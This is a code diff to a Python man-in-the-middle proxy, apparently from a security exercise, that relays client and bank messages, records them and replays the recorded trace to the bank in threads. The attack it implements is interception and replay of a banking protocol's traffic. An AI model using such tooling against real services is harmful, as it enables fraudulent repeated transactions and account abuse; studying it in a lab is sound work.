@@ -15,14 +15,14 @@ def BankThread(forwardQueue:queue.Queue(),backQueue:queue.Queue(),BankSocket:soc
             if tracing:
                 trace.append(message)
             bankSend(BankSocket,message)
-            print(f"MITM -> Bank {message[:10]}")
+            #print(f"MITM -> Bank {message[:10]}")
     
         try:
             responseMessage = bankReceive(BankSocket)
             if len(responseMessage): 
                 backQueue.put(responseMessage)
                 packetsSent = packetsSent + 1
-                print(f"Bank -> MITM {responseMessage[:10]} packets sent {packetsSent}")
+                #print(f"Bank -> MITM {responseMessage[:10]} packets sent {packetsSent}")
         except Exception:
             continue
 
@@ -40,7 +40,7 @@ def ClientThread(forwardQueue:queue.Queue(),backQueue:queue.Queue(),ClientSocket
             responseMessage = backQueue.get()
             clientSend(ClientSocket,responseMessage)
             packetsSent = packetsSent + 1
-            print(f"MITM -> Client {responseMessage[:10]} packets sent {packetsSent}")
+            #print(f"MITM -> Client {responseMessage[:10]} packets sent {packetsSent}")
 
         try:
             message = clientReceive(ClientSocket)
@@ -84,16 +84,26 @@ def bankReceiveThread(BankSocket:socket.socket):
     BankSocket.setblocking(0)
 
     startTime = time.time()
-    while time.time() - startTime < 1.5:
-        bankReceive(BankSocket)
+    while True:
+        try:
+            bankReceive(BankSocket)
+        except Exception:
+            continue
 
 def replay(BankSocket:socket.socket, trace:list):
 
     BankSocket.setblocking(0)
 
-    for message in trace:
-        bankSend(BankSocket,message) 
-        print(f"message {message[:10]}")
+    # ClientThread
+    sendTread = threading.Thread(target=bankSendThread, args=(BankSocket,trace))
+    sendTread.start()
+
+    # ClientThread
+    receiveThread = threading.Thread(target=bankReceiveThread, args=(BankSocket,))
+    receiveThread.start()
+
+    sendTread.join()
+    #receiveThread.join()
 
     print("Replay completed")
     return 
